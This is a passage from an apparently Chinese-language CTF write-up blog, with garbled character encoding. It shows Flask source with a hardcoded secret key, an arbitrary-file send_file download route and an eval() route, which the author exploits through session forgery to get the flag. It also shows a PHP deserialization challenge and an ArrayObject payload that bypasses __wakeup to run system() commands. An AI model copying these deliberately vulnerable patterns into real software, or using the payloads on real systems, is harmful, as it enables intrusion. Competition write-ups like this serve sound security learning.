class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å»è¿›è¡Œseesionä¼ªé€ è¯•è¯•</p><p><img src="../images/image-20230404165301393.png" alt="image-20230404165301393"></p><p>æ‹¿åˆ°session</p><p><img src="../images/image-20230404170039525.png" alt="image-20230404170039525"></p><p>sessionä¼ªé€ æˆåŠŸäº†</p><p><img src="../images/image-20230404170123835.png" alt="image-20230404170123835"></p><p>ç„¶åç™»å½•ç®¡ç†å‘˜è´¦æˆ·æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯æœ‰ä¸ªä¸‹è½½çš„æ¥å£</p><p><img src="../images/image-20230404170215806.png" alt="image-20230404170215806"></p><p>å‘ç°æ˜¯ä¸ªå‡çš„flag</p><p><img src="../images/image-20230404170320851.png" alt="image-20230404170320851"></p><p>å‘ç°ä»–æ˜¯è¿™æ ·ä¸‹è½½æ–‡ä»¶çš„ï¼Œï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¸‹è½½å®Œæ•´çš„æºç è¿›è¡ŒæŸ¥çœ‹</p><p><strong>app.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°åœ¨helloè·¯ç”±é‚£ï¼Œå‘ç°æœ‰evalå‘½ä»¤ï¼Œç„¶åå°±è¿›è¡Œä¼ å€¼ï¼Œevalä¸ºå‚æ•°</p><p>ç„¶åæºç é‡Œæ²¡æœ‰osåº“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è‡ªå·±ä¼ ä¸€ä¸ªosåº“è¿›å»</p><p><img src="../images/image-20230404170910299.png" alt="image-20230404170910299"></p><p>æˆåŠŸæ‹¿åˆ°flag</p><p>é‡åˆ°è¿™ç§ç»™keyçš„é¢˜ï¼Œä¸€èˆ¬éƒ½æ˜¯è€ƒseesionä¼ªé€ æˆ–åˆ™æ˜¯pythonçš„pickelååºåˆ—åŒ–</p><h2 id="æš—ç½‘èŠå¤©å®¤"><a href="#æš—ç½‘èŠå¤©å®¤" class="headerlink" title="æš—ç½‘èŠå¤©å®¤"></a>æš—ç½‘èŠå¤©å®¤</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230404173019155.png" alt="image-20230404173019155"></p><p><strong>å…¬é’¥åŠ å¯†       ç§é’¥è§£å¯†</strong></p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>é¢˜ç›®</p><p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">åˆ«äººçš„æ€»ç»“wp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>ä¿®æ”¹å±æ€§å€¼æ˜¯è¿™äº›ç‰ˆæœ¬æ‰æœ‰ç”¨ï¼Œè¿™é‡Œçš„è¯æ˜¯æ²¡æœ‰ç”¨çš„</p><p>è€ƒç‚¹ï¼šPHP7.3 __wakeupç»•è¿‡ï¼ŒArrayObjectå†…ç½®ç±»</p><p>ä¼—æ‰€å‘¨çŸ¥å¯ä»¥ä½¿ç”¨Cè¿›è¡Œç»•è¿‡wakeupï¼Œä½†è¿™æ ·æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä½ æŠŠOæ”¹ä¸ºCåæ˜¯æ²¡åŠæ³•æœ‰å±æ€§çš„ï¼Œé‚£å‡å¦‚éœ€è¦ç”¨å±æ€§å‘½ä»¤æ‰§è¡Œå°±ä¸è¡Œäº†QWQ</p><p>è¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥ç”¨å†…ç½®ç±»<strong>ArrayObject</strong>ï¼Œè¿™ä¸ªå†…ç½®ç±»åºåˆ—åŒ–ç»“æœå¦‚ä¸‹</p><p><img src="../images/image-20230404175635385.png" alt="image-20230404175635385"></p><p>è¿™ä¸ªé¢˜ç›®å¾ˆæ˜æ˜¾å°±æ˜¯è¦æ‰§è¡Œsystemæ–¹æ³•ï¼Œç„¶åä¸å¯ä»¥ä»¥<code>O\a</code>æ‰“å¤´ï¼Œå‡å¦‚ä¸banæ‰açš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨aæ•°ç»„é‡Œé¢æ”¾ä¸Šæˆ‘ä»¬çš„æ¶æ„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ååºåˆ—åŒ–ï¼Œä½†æ˜¯è¿™é‡Œéƒ½å»æ‰äº†ï¼Œæ‰€ä»¥å›åˆ°ä¸Šé¢è¯´çš„é‚£ä¸ªArrayObjectï¼Œä»–æ˜¯Cå¼€å¤´çš„ï¼Œå¹¶ä¸”å¯ä»¥ç»•è¿‡Oï¼Œç„¶åè¿˜å¯ä»¥å¸¦å±æ€§ååºåˆ—åŒ–ï¼Œç¬¦åˆæ¡ä»¶ï¼Œå› æ­¤å¯ä»¥æ„é€ payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.scuctf.com/ctfwiki/web/5.unserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">phpååºåˆ—åŒ–aå¼€å¤´çš„ä½¿ç”¨</a></p><p><strong>æŸ¥æ‰¾è„šæœ¬</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();<span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;unserialize&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        ))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181426665.png" alt="image-20230404181426665"></p><p>ç»“æœå¦‚ä¸‹ï¼Œæ³¨æ„åˆ°äº†è¿˜æœ‰ArrayIteratorï¼Œå®ç°äº†unserializeæ¥å£çš„å¤§æ¦‚ç‡æ˜¯Cæ‰“å¤´ï¼Œå› æ­¤åœ¨è¿™å‡ ä¸ªç±»ä¸­å¯»æ‰¾ï¼</p><p>æµ‹è¯•å‘ç°ArrayIterratoræ˜¯å¯ä»¥çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span 